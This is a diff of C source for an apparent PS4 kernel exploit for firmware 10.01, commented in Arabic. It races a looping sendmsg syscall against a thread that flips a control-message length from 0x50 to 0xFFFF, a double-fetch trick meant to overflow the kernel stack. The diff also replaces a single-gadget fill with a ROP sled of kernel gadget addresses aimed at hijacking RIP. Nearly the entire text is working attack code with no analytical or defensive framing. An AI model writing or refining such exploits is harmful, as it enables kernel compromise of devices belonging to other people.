@@ -1,9 +1,10 @@
-
 #include <ps4.h>
+#include <stdint.h>
+#include <string.h>
 
-// الإزاحات التي وجدتها لنسخة 10.01
+// الإزاحات لنسخة 10.01
 #define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
-#define OFF_RET                  0x0008E0
+#define OFF_RET                  0x0008E0 
 
 struct msghdr {
     void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
@@ -16,16 +17,23 @@ uint8_t control_buf[CONTROL_LEN];
 struct cmsghdr *cmsg;
 int global_sock;
 
+// دالة الإرسال (الخيط الأول)
 void *sendmsg_thread(void *arg) {
+    (void)arg;
     struct msghdr msg = {0};
     msg.msg_control = control_buf;
     msg.msg_controllen = CONTROL_LEN;
-    while(1) { syscall(28, global_sock, &msg, 0); }
+    while(1) { 
+        syscall(28, global_sock, &msg, 0); 
+    }
     return NULL;
 }
 
+// دالة السباق (الخيط الثاني) - استهداف ثغرة الـ Double Fetch
 void *race_thread(void *arg) {
+    (void)arg;
     while(1) {
+        // نغير الطول من "صغير وقانوني" إلى "كبير جداً" لكسر المكدس
         cmsg->cmsg_len = 0x50;   
         cmsg->cmsg_len = 0xFFFF; 
     }
@@ -33,26 +41,33 @@ void *race_thread(void *arg) {
 }
 
 int _main(struct thread *td) {
+    (void)td;
     initKernel();
     initLibc();
 
     uint64_t kbase = get_kernel_base();
-    // استخدام Gadget بسيط جداً: فقط RET
-    // إذا نجح الـ Bug، ستقوم النواة بتنفيذ RET والعودة بسلام (أو كراش مختلف)
-    uint64_t trigger_gadget = kbase + OFF_PUSH_RSP_POP_RSI_RET;
+    uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
+    uint64_t step2 = kbase + OFF_RET; // لضمان عدم توقف المعالج عند 0
 
     global_sock = syscall(97, 2, 2, 0);
     
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
-    cmsg->cmsg_type = 7; // IP_RETOPTS
+    cmsg->cmsg_type = 7; 
     cmsg->cmsg_len = 0x50;
 
-    // ملء منطقة ext_free بالعنوان لترصد التنفيذ
-    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
-        *(uint64_t *)(control_buf + i) = trigger_gadget;
+    /* تطبيق الورقة البحثية: 
+       المكدس يسحب 8 بايت (Quad-word). 
+       سنقوم بعمل "ROP Sled" لضمان إصابة RIP مهما كانت الإزاحة.
+    */
+    for (int i = 0x40; i < CONTROL_LEN - 16; i += 16) {
+        *(uint64_t *)(control_buf + i)     = step1; // سيذهب لـ RBP أو RIP
+        *(uint64_t *)(control_buf + i + 8) = step2; // العنوان التالي في السلسلة
     }
+
+    // إضافة Debug بسيط (اختياري إذا كنت تستخدم الشبكة)
+    // printf_debug("Starting Race... kbase: %p\n", (void*)kbase);
 
     ScePthread t1, t2;
     scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
@@ -60,5 +75,6 @@ int _main(struct thread *td) {
 
     scePthreadJoin(t1, NULL);
     scePthreadJoin(t2, NULL);
+
     return 0;
 }
